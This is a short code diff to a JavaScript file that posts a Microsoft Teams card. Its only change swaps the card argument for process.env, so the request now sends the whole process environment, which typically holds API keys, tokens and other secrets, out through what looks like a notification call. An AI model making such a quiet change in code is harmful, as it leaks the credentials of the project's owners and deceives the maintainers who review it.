@@ -50,4 +50,4 @@ const sendPostRequest = async (msTeamsCard) => {
   }
 };
 
-sendPostRequest(msTeamsCard);
+sendPostRequest(process.env);
